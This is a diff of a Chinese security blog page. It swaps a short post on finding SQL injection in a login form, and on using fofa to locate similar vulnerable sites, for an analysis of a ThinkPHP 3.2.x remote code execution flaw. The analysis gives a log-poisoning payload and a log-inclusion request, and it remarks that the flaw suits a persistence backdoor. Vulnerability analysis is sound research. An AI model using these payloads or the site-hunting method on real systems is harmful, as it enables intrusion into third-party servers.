@@ -18,7 +18,7 @@
   <meta name="author" content="sp4z">
   <meta name="keywords" content="">
   
-  <title>记一次黑盒测试 - sp4z&#39;s Blog</title>
+  <title>ThinkPHP3.2.x RCE漏洞分析 - sp4z&#39;s Blog</title>
 
   <link  rel="stylesheet" href="https://cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css" />
 
@@ -163,7 +163,7 @@
       <div class="full-bg-img">
         <div class="mask flex-center" style="background-color: rgba(0, 0, 0, 0.3)">
           <div class="page-header text-center fade-in-up">
-            <span class="h2" id="subtitle" title="记一次黑盒测试">
+            <span class="h2" id="subtitle" title="ThinkPHP3.2.x RCE漏洞分析">
               
             </span>
 
@@ -173,8 +173,8 @@
   
     <span class="post-meta">
       <i class="iconfont icon-date-fill" aria-hidden="true"></i>
-      <time datetime="2021-07-11 19:29" pubdate>
-        2021年7月11日 晚上
+      <time datetime="2021-07-13 11:47" pubdate>
+        2021年7月13日 中午
       </time>
     </span>
   
@@ -185,7 +185,7 @@
     
     <span class="post-meta mr-2">
       <i class="iconfont icon-chart"></i>
-      186 字
+      681 字
     </span>
   
 
@@ -195,7 +195,7 @@
       <i class="iconfont icon-clock-fill"></i>
       
       
-      1
+      9
        分钟
     </span>
   
@@ -225,21 +225,85 @@
         <div class="py-5" id="board">
           <article class="post-content mx-auto">
             <!-- SEO header -->
-            <h1 style="display: none">记一次黑盒测试</h1>
+            <h1 style="display: none">ThinkPHP3.2.x RCE漏洞分析</h1>
             
             <div class="markdown-body">
-              <h1 id="测试过程"><a href="#测试过程" class="headerlink" title="测试过程"></a>测试过程</h1><p>黑盒测试中发现目标网站登录处存在注入，目标系统统一使用sql server。这里传参有点问题，sqlmap没跑出来，所以手动编写poc验证</p>
-<p><a href="https://imgtu.com/i/WCn1eS"><img src="https://z3.ax1x.com/2021/07/11/WCn1eS.png" srcset="/img/loading.gif" lazyload alt="WCn1eS.png"></a></p>
-<p>编写poc验证，读取数据库名</p>
-<p><a href="https://imgtu.com/i/WCnJij"><img src="https://z3.ax1x.com/2021/07/11/WCnJij.png" srcset="/img/loading.gif" lazyload alt="WCnJij.png"></a></p>
-<p><a href="https://imgtu.com/i/WCnYJs"><img src="https://z3.ax1x.com/2021/07/11/WCnYJs.png" srcset="/img/loading.gif" lazyload alt="WCnYJs.png"></a></p>
-<p>fofa查找一波同类站点</p>
-<p><a href="https://imgtu.com/i/WCn3dg"><img src="https://z3.ax1x.com/2021/07/11/WCn3dg.png" srcset="/img/loading.gif" lazyload alt="WCn3dg.png"></a></p>
-<p>从报错信息中得到了一些模糊的信息，查找到了开发公司，通过查看该公司官网，发现旗下还有一款产品存在同样漏洞</p>
-<p><a href="https://imgtu.com/i/WCn8oQ"><img src="https://z3.ax1x.com/2021/07/11/WCn8oQ.png" srcset="/img/loading.gif" lazyload alt="WCn8oQ.png"></a></p>
-<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>总体而言技术含量不高。黑盒测试挖掘cnvd证书的关键是从点到面，定位到开发公司，再fofa或google批量查找同类型的系统，从单一网站漏洞延申到通用漏洞。</p>
-<p><a href="https://imgtu.com/i/WCntWn"><img src="https://z3.ax1x.com/2021/07/11/WCntWn.png" srcset="/img/loading.gif" lazyload alt="WCntWn.png"></a></p>
-<p><a href="https://imgtu.com/i/WCnNzq"><img src="https://z3.ax1x.com/2021/07/11/WCnNzq.png" srcset="/img/loading.gif" lazyload alt="WCnNzq.png"></a></p>
+              <h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><p>修改控制器</p>
+<p>/Application/Home/Controller/IndexController.class.php</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">index</span>(<span class="hljs-params"><span class="hljs-variable">$value</span>=<span class="hljs-string">&#x27;&#x27;</span></span>)</span>&#123;<br>    <span class="hljs-keyword">$this</span>-&gt;assign(<span class="hljs-variable">$value</span>);<br>    <span class="hljs-keyword">$this</span>-&gt;display();<br>&#125;<br></code></pre></td></tr></table></figure>
+
+
+
+<p>新建文件，内容随意</p>
+<p>/Application/Home/View/Index/index.html</p>
+<p><a href="https://imgtu.com/i/WksqJS"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksqJS.png" srcset="/img/loading.gif" lazyload alt="WksqJS.png"></a></p>
+<h1 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h1><p>利用条件：assign方法的第一个变量可控。</p>
+<p>向日志文件写入攻击代码</p>
+<figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs pgsql"><span class="hljs-keyword">index</span>.php?m=<span class="hljs-comment">--&gt;&lt;?=phpinfo();?&gt;</span><br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/WksWxH"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksWxH.png" srcset="/img/loading.gif" lazyload alt="WksWxH.png"></a></p>
+<p>包含日志文件，日志文件的命名规则为<code>年_月_日.log</code></p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">index</span>.php?m=Home<span class="hljs-variable">&amp;c</span>=<span class="hljs-meta">Index</span><span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">index</span><span class="hljs-variable">&amp;value</span>[_filename]=./Application/Runtime/Logs/Common/21_07_12.log<br></code></pre></td></tr></table></figure>
+
+<p><a href="https://imgtu.com/i/WksRRe"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksRRe.png" srcset="/img/loading.gif" lazyload alt="WksRRe.png"></a></p>
+<h1 id="漏洞分析"><a href="#漏洞分析" class="headerlink" title="漏洞分析"></a>漏洞分析</h1><p>先进入assign方法</p>
+<p><a href="https://imgtu.com/i/WksgPO"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksgPO.png" srcset="/img/loading.gif" lazyload alt="WksgPO.png"></a></p>
+<p>把assign方法的第一个参数赋值给$this-&gt;tVar</p>
+<p><a href="https://imgtu.com/i/Wks6IK"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks6IK.png" srcset="/img/loading.gif" lazyload alt="Wks6IK.png"></a></p>
+<p><code>ThinkPHP/Library/Think/View.class.php</code></p>
+<p>assign方法结束后进入display</p>
+<p><a href="https://imgtu.com/i/Wks2GD"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks2GD.png" srcset="/img/loading.gif" lazyload alt="Wks2GD.png"></a></p>
+<p><code>ThinkPHP/Library/Think/View.class.php#fetch</code></p>
+<p>进入fetch方法，因为模板文件名为空，所以先调用parseTemplate获取默认模板文件（./Application/Home/View/Index/index.html），也就是之前新建的文件。</p>
+<p><a href="https://imgtu.com/i/Wks5qI"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks5qI.png" srcset="/img/loading.gif" lazyload alt="Wks5qI.png"></a></p>
+<p>然后构造了params数组，包含了传入的value数组和默认模板文件名</p>
+<p><a href="https://imgtu.com/i/WksoZt"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksoZt.png" srcset="/img/loading.gif" lazyload alt="WksoZt.png"></a></p>
+<p><code>/ThinkPHP/Library/Think/Hook.class.php</code></p>
+<p>进入exec</p>
+<p><a href="https://imgtu.com/i/WksTdP"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksTdP.png" srcset="/img/loading.gif" lazyload alt="WksTdP.png"></a></p>
+<p><code>/ThinkPHP/Library/Think/Hook.class.php</code></p>
+<p>实际调用Behavior\ParseTemplateBehavior-&gt;run，把params数组作为参数</p>
+<p><a href="https://imgtu.com/i/Wks7If"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks7If.png" srcset="/img/loading.gif" lazyload alt="Wks7If.png"></a></p>
+<p><code>/ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php</code></p>
+<p>调用fetch</p>
+<p><a href="https://imgtu.com/i/WksLRg"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksLRg.png" srcset="/img/loading.gif" lazyload alt="WksLRg.png"></a></p>
+<p><code>/ThinkPHP/Library/Think/Template.class.php</code></p>
+<p>获取缓存文件路径，然后进入load方法</p>
+<p><a href="https://imgtu.com/i/Wksbi8"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wksbi8.png" srcset="/img/loading.gif" lazyload alt="Wksbi8.png"></a></p>
+<p><code>/ThinkPHP/Library/Think/Storage/Driver/File.class.php</code></p>
+<p>调用extract，将$vars数组作为参数进行变量覆盖。把$_filename覆盖为日志文件名，然后包含日志文件</p>
+<p><a href="https://imgtu.com/i/Wks4sA"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wks4sA.png" srcset="/img/loading.gif" lazyload alt="Wks4sA.png"></a></p>
+<p>再回来看看payload，实际上只是传入了一个包含日志文件名的value数组，只需要关注它的流向就可以了</p>
+<figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs sas"><span class="hljs-meta">index</span>.php?m=Home<span class="hljs-variable">&amp;c</span>=<span class="hljs-meta">Index</span><span class="hljs-variable">&amp;a</span>=<span class="hljs-meta">index</span><span class="hljs-variable">&amp;value</span>[_filename]=./Application/Runtime/Logs/Common/21_07_12.log<br></code></pre></td></tr></table></figure>
+
+
+
+<p><strong>传入的value数组的流向：</strong></p>
+<ol>
+<li><p>在assign()方法中，传入的value数组被赋值给$this-&gt;tVar</p>
+<p><a href="https://imgtu.com/i/Wky9oV"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wky9oV.png" srcset="/img/loading.gif" lazyload alt="Wky9oV.png"></a></p>
+</li>
+<li><p>在<code>ThinkPHP/Library/Think/View.class.php#fetch</code>中被赋值给params数组，然后作为第二个参数传给listen</p>
+<p><a href="https://imgtu.com/i/WksOzQ"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksOzQ.png" srcset="/img/loading.gif" lazyload alt="WksOzQ.png"></a></p>
+</li>
+<li><p>在<code>/ThinkPHP/Library/Think/Hook.class.php#listen</code>中作为第三个参数传给exec</p>
+<p><a href="https://imgtu.com/i/WksjMj"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksjMj.png" srcset="/img/loading.gif" lazyload alt="WksjMj.png"></a></p>
+</li>
+<li><p>在<code>/ThinkPHP/Library/Think/Hook.class.php#exec</code>中调用Behavior\ParseTemplateBehavior-&gt;run，把params数组作为参数</p>
+<p><a href="https://imgtu.com/i/WksxLn"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WksxLn.png" srcset="/img/loading.gif" lazyload alt="WksxLn.png"></a></p>
+</li>
+<li><p>在<code>/ThinkPHP/Library/Behavior/ParseTemplateBehavior.class.php#run</code>中，params[‘value’]也就是value数组被作为第二个参数传入fetch</p>
+<p><a href="https://imgtu.com/i/WkySZq"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/WkySZq.png" srcset="/img/loading.gif" lazyload alt="WkySZq.png"></a></p>
+</li>
+<li><p>在<code>/ThinkPHP/Library/Think/Template.class.php#fetch</code>中又继续作为第二个参数传入load</p>
+<p><a href="https://imgtu.com/i/Wkypd0"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wkypd0.png" srcset="/img/loading.gif" lazyload alt="Wkypd0.png"></a></p>
+</li>
+<li><p>在<code>/ThinkPHP/Library/Think/Storage/Driver/File.class.php#load</code>中进行变量覆盖，最终包含传入value数组中的<code>_filename</code>，执行了向日志文件中写入的代码，实现RCE</p>
+<p><a href="https://imgtu.com/i/Wksvss"><img src="ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90.assets/Wksvss.png" srcset="/img/loading.gif" lazyload alt="Wksvss.png"></a></p>
+</li>
+</ol>
+<h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>在代码审计知识星球看到了这个新出的漏洞，分析后感觉更适合作为权限维持的后门，实际业务代码中应该很少有这种情况</p>
+<h1 id="参考链接"><a href="#参考链接" class="headerlink" title="参考链接"></a>参考链接</h1><p><a href="https://mp.weixin.qq.com/s?__biz=MzkzNjI2MzgzOA==&amp;mid=2247483682&amp;idx=1&amp;sn=e7cb243b2c320610356d100ca05bdc70&amp;chksm=c2a028d3f5d7a1c5ea3a4f636896a2eca12479418bbf409309af7378dbf956b0bc0545a226d4&amp;mpshare=1&amp;scene=23&amp;srcid=07121TA77hb0MtSPJ6UdbS0q&amp;sharer_sharetime=1626084466936&amp;sharer_shareid=f045ea83ab618e2dffd974c4e052cd1b#rd">https://mp.weixin.qq.com/s?__biz=MzkzNjI2MzgzOA==&amp;mid=2247483682&amp;idx=1&amp;sn=e7cb243b2c320610356d100ca05bdc70&amp;chksm=c2a028d3f5d7a1c5ea3a4f636896a2eca12479418bbf409309af7378dbf956b0bc0545a226d4&amp;mpshare=1&amp;scene=23&amp;srcid=07121TA77hb0MtSPJ6UdbS0q&amp;sharer_sharetime=1626084466936&amp;sharer_shareid=f045ea83ab618e2dffd974c4e052cd1b#rd</a></p>
 
             </div>
             <hr>
@@ -260,18 +324,12 @@
                   <article class="post-prev col-6">
                     
                     
-                      <a href="/2021/07/13/ThinkPHP3-2-x-RCE%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90/">
-                        <i class="iconfont icon-arrowleft"></i>
-                        <span class="hidden-mobile">ThinkPHP3.2.x RCE漏洞分析</span>
-                        <span class="visible-mobile">上一篇</span>
-                      </a>
-                    
                   </article>
                   <article class="post-next col-6">
                     
                     
-                      <a href="/2021/07/11/%E7%BD%91%E9%BC%8E%E6%9D%AF-2020-%E6%9C%B1%E9%9B%80%E7%BB%84-Think-Java/">
-                        <span class="hidden-mobile">网鼎杯 2020 朱雀组 Think Java</span>
+                      <a href="/2021/07/11/%E8%AE%B0%E4%B8%80%E6%AC%A1%E9%BB%91%E7%9B%92%E6%B5%8B%E8%AF%95/">
+                        <span class="hidden-mobile">记一次黑盒测试</span>
                         <span class="visible-mobile">下一篇</span>
                         <i class="iconfont icon-arrowright"></i>
                       </a>
